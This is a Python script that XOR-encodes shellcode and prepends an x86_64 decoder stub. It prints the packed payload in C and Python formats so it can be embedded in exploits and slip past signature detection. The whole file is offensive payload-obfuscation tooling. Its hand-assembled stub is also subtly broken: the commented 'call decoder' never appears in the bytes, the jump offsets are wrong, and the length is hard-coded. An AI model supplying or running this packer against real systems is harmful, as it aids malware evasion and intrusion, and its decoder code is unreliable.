#!/usr/bin/env python3
"""
Shellcode XOR Encryptor - Generates obfuscated shellcode with decoder
"""

import sys
import random

def read_shellcode_from_file(filename):
    """Read shellcode from file - expects raw binary or hex string"""
    with open(filename, 'rb') as f:
        data = f.read()
    
    # Check if file contains hex string like "\x31\xc0\x50"
    try:
        as_text = data.decode('ascii')
        if '\\x' in as_text:
            # Parse hex string format
            import re
            hex_bytes = re.findall(r'\\x([0-9a-fA-F]{2})', as_text)
            return bytes([int(b, 16) for b in hex_bytes])
    except:
        pass
    
    # Assume raw binary
    return data

def xor_encrypt(shellcode, key):
    """XOR encrypt shellcode with single byte key"""
    return bytes([b ^ key for b in shellcode])

def generate_decoder_stub(key):
    """Generate x86_64 decoder stub that XOR decrypts shellcode"""
    # This is hand-crafted assembly for a simple XOR decoder
    # .text:
    #     jmp     get_pc
    # decoder:
    #     pop     rsi           ; rsi = shellcode address
    #     xor     rcx, rcx
    #     mov     cl, 0xFF      ; length (adjust as needed)
    # decode_loop:
    #     xor     byte [rsi], KEY
    #     inc     rsi
    #     loop    decode_loop
    #     jmp     rsi_original  ; jump to decrypted shellcode
    # get_pc:
    #     call    decoder
    #     ; shellcode bytes follow
    
    stub = bytes([
        0xeb, 0x0f,           # jmp short get_pc
        0x5e,                 # pop rsi
        0x48, 0x31, 0xc9,     # xor rcx, rcx
        0xb1, 0xff,           # mov cl, 0xff (adjust length)
        0x80, 0x36, key,      # xor byte [rsi], key
        0x48, 0xff, 0xc6,     # inc rsi
        0xe2, 0xf9,           # loop decode_loop
        0xff, 0xe6            # jmp rsi
    ])
    return stub

def output_formatted(shellcode, format_type='c'):
    """Output shellcode in various formats"""
    hex_str = ''.join(f'\\x{b:02x}' for b in shellcode)
    
    if format_type == 'c':
        print('char shellcode[] = "', end='')
        print(hex_str, end='')
        print('";')
    elif format_type == 'python':
        print(f'shellcode = b"{hex_str}"')
    elif format_type == 'raw':
        sys.stdout.buffer.write(shellcode)
    else:
        print(hex_str)

def main():
    if len(sys.argv) < 2:
        print("Usage: python shellcode_encryptor.py <shellcode_file> [key]")
        print("\nExample shellcode file (raw.bin):")
        print("  echo -ne '\\x31\\xc0\\x50' > shellcode.bin")
        sys.exit(1)
    
    # Read shellcode
    filename = sys.argv[1]
    try:
        original = read_shellcode_from_file(filename)
        print(f"[+] Read {len(original)} bytes of shellcode")
    except Exception as e:
        print(f"[-] Failed to read file: {e}")
        sys.exit(1)
    
    # Determine key
    if len(sys.argv) >= 3:
        key = int(sys.argv[2]) & 0xFF
    else:
        key = random.randint(1, 255)
        print(f"[+] Using random XOR key: 0x{key:02x}")
    
    # Encrypt
    encrypted = xor_encrypt(original, key)
    print(f"[+] Encrypted {len(encrypted)} bytes (XOR 0x{key:02x})")
    
    # Generate decoder stub
    # Note: Length byte needs adjustment for your shellcode
    decoder = generate_decoder_stub(key)
    
    # Combine
    final = decoder + encrypted
    
    print(f"\n[+] Final payload size: {len(final)} bytes")
    print(f"    (Decoder: {len(decoder)} bytes + Payload: {len(encrypted)} bytes)")
    
    print("\n[*] Encrypted + Decoder shellcode (C format):")
    output_formatted(final, 'c')
    
    print("\n[*] Just the encrypted payload (Python format):")
    output_formatted(encrypted, 'python')

if __name__ == "__main__":
    main()
